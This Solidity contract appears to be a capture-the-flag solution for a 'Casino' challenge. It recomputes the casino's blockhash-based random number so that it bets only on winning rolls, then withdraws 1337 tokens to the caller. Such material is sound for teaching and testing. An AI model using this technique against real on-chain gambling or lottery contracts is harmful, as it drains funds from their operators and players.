//SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.0;

import "./DUCoin.sol";
import "./Casino.sol";

contract Gambler {
    DUCoin private immutable ducoin;
    Casino private immutable casino;

    constructor(address _ducoin, address _casino) {
        ducoin = DUCoin(_ducoin);
        casino = Casino(_casino);
        casino.getTrialCoins();
        ducoin.approve(address(casino), 7);
        casino.deposit(7);
    }

    function _randomNumber() internal view returns(uint8) {
        uint256 ab = uint256(blockhash(block.number - 1));
        uint256 a = ab & 0xffffffff;
        uint256 b = (ab >> 32) & 0xffffffff;
        uint256 x = uint256(blockhash(block.number));
        return uint8((a * x + b) % 6);
    }

    function gamble() public {
        uint256 tokenBalance = casino.balances(address(this));

        if(_randomNumber() == 0) {
            casino.play(tokenBalance);
        }
    }

    function solve() public {
        casino.withdraw(1337);
        ducoin.transfer(msg.sender, 1337);
    }
}